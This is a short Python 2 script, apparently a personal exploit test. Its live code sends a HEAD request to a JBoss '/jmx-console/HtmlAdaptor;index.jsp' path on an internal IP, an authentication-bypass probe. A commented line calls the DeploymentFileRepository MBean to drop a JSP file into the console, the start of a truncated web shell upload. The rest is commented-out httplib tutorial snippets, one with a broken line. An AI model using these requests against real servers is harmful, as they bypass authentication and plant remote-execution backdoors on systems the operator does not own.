# -*- coding: utf-8 -*-
import httplib 
#conn = httplib.HTTPConnection("localhost:8080")
conn = httplib.HTTPConnection("10.244.178.87:8080")
conn.request("HEAD", "/jmx-console/HtmlAdaptor;index.jsp") 
#conn.request("HEAD", "/jmx-console/HtmlAdaptor;index.jsp?action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=6&arg0=..%2Fjmx-console.war%2F&arg1=ikki&arg2=.jsp&arg3=%3C%25%40+page+import%3D%22java.io.*")
r1 = conn.getresponse() 
print r1.status, r1.reason 
data1 = r1.read() 
print data1




#conn = httplib.HTTPConnection("www.python.org") 
#conn.request("HEAD", "/index.html") 
#res = conn.getresponse() 
#print res.status, res.reason 
# 
#data = res.read() 
#print len(data), data 


#conn = httplib.HTTPConnection("www.python.org") 
#conn.request("GET", "/index.html") 
#r1 = conn.getresponse() 
#print r1.status, r1.reason 
#data1 = r1.read() 
#print data1
# 
#conn.request("GET", "/parrot.spam") 
#r2 = conn.getresponse() 
#print r2.status, r2.reason 
#conn.close()



#01    >>> import httplib, urllib 
#02    >>> params = urllib.urlencode({'spam': 1, 'eggs': 2, 'bacon': }) 
#03    >>> headers = {"Content-type": "application/x-www-form-urlencoded", 
#04    ...            "Accept": "text/plain"} 
#05    >>> conn = httplib.HTTPConnection("musi-cal.mojam.com:80") 
#06    >>> conn.request("POST", "/cgi-bin/query", params, headers) 
#07    >>> response = conn.getresponse() 
#08    >>> print response.status, response.reason 
#09    200 OK 
#10    >>> data = response.read() 
#11    
#>>> conn.close()
